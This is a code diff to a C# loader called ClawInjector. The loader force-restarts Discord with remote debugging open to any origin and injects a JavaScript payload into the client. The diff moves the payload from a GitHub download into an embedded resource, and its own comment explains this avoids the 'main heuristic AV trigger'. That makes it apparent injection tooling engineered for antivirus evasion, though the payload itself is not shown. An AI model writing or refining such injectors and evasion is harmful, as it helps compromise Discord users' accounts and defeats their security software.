@@ -7,6 +7,7 @@ using System.Net;
 using System.Net.Http;
 using System.Net.Sockets;
 using System.Net.WebSockets;
+using System.Reflection;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
@@ -16,7 +17,7 @@ namespace ClawInjector
 {
     internal static class Program
     {
-        private const string DefaultPayloadUrl = "https://github.com/l-limon-l/Claw/releases/download/Main/index.js";
+        private const string PayloadResourceName = "Claw.payload.js";
         private const int DefaultDebugPort = 10222;
         private static readonly TimeSpan DiscordTargetTimeout = TimeSpan.FromSeconds(90);
         private static readonly TimeSpan StableTargetDelay = TimeSpan.FromSeconds(8);
@@ -66,8 +67,8 @@ namespace ClawInjector
                 StopDiscordProcesses();
                 await WaitForDebugPortFreeAsync(options.DebugPort, TimeSpan.FromSeconds(10));
 
-                PrintStep("[3/5]", "Downloading cloud payload...");
-                string payload = await LoadPayloadAsync(options);
+                PrintStep("[3/5]", "Loading embedded payload...");
+                string payload = LoadEmbeddedPayload();
                 if (string.IsNullOrWhiteSpace(payload))
                 {
                     throw new InvalidOperationException("Payload is empty.");
@@ -100,10 +101,27 @@ namespace ClawInjector
             }
         }
 
-        private static async Task<string> LoadPayloadAsync(LoaderOptions options)
+        private static string LoadEmbeddedPayload()
         {
-            PrintSubStep(options.PayloadUrl);
-            return await Http.GetStringAsync(options.PayloadUrl);
+            // The payload is compiled into the executable as an embedded resource
+            // (see <EmbeddedResource> in ClawInjector.csproj). Reading it from inside
+            // the binary avoids the runtime "download code from the internet and run it"
+            // behavior, which is both a tamper risk and the main heuristic AV trigger.
+            Assembly assembly = Assembly.GetExecutingAssembly();
+            using (Stream stream = assembly.GetManifestResourceStream(PayloadResourceName))
+            {
+                if (stream == null)
+                {
+                    throw new InvalidOperationException(
+                        "Embedded payload '" + PayloadResourceName + "' was not found. " +
+                        "Rebuild with a fresh index.js (run: npm run build, then dotnet build).");
+                }
+
+                using (StreamReader reader = new StreamReader(stream, Encoding.UTF8))
+                {
+                    return reader.ReadToEnd();
+                }
+            }
         }
 
         private static string ResolveDiscordExecutable(string explicitPath)
@@ -357,14 +375,20 @@ namespace ClawInjector
 
         private static void StartDiscord(string discordPath, int debugPort)
         {
+            // UseShellExecute=true launches Discord detached from the loader's console.
+            // With UseShellExecute=false the GUI child inherited our console, which caused
+            // two problems: Chromium/Electron dumped its remote-debugging logs into our
+            // window, and closing the loader sent CTRL_CLOSE to Discord (killing it too).
+            // Shell-launching a GUI app avoids console inheritance entirely.
+            // (CreateNoWindow is incompatible with UseShellExecute=true and is not needed
+            // here since Discord never opens a console of its own.)
             ProcessStartInfo startInfo = new ProcessStartInfo
             {
                 FileName = discordPath,
                 Arguments = string.Format(
                     "--remote-debugging-port={0} --remote-allow-origins=*",
                     debugPort),
-                UseShellExecute = false,
-                CreateNoWindow = true,
+                UseShellExecute = true,
                 WorkingDirectory = Path.GetDirectoryName(discordPath)
             };
 
@@ -800,13 +824,11 @@ namespace ClawInjector
         private sealed class LoaderOptions
         {
             public int DebugPort { get; private set; }
-            public string PayloadUrl { get; private set; }
             public string DiscordExe { get; private set; }
 
             public static LoaderOptions Parse(string[] args)
             {
                 int debugPort = ParseInt(Environment.GetEnvironmentVariable("CLAW_DEBUG_PORT")) ?? DefaultDebugPort;
-                string payloadUrl = Environment.GetEnvironmentVariable("CLAW_PAYLOAD_URL") ?? DefaultPayloadUrl;
                 string discordExe = Environment.GetEnvironmentVariable("CLAW_DISCORD_EXE");
 
                 for (int i = 0; i < args.Length; i++)
@@ -838,10 +860,6 @@ namespace ClawInjector
                             if (!parsedPort.HasValue) throw new ArgumentException("Port must be a number.");
                             debugPort = parsedPort.Value;
                             break;
-                        case "--payload-url":
-                            if (i + 1 >= args.Length) throw new ArgumentException("Missing value for --payload-url.");
-                            payloadUrl = args[++i];
-                            break;
                         case "--discord-exe":
                             if (i + 1 >= args.Length) throw new ArgumentException("Missing value for --discord-exe.");
                             discordExe = args[++i];
@@ -852,7 +870,6 @@ namespace ClawInjector
                 return new LoaderOptions
                 {
                     DebugPort = debugPort,
-                    PayloadUrl = payloadUrl,
                     DiscordExe = discordExe
                 };
             }
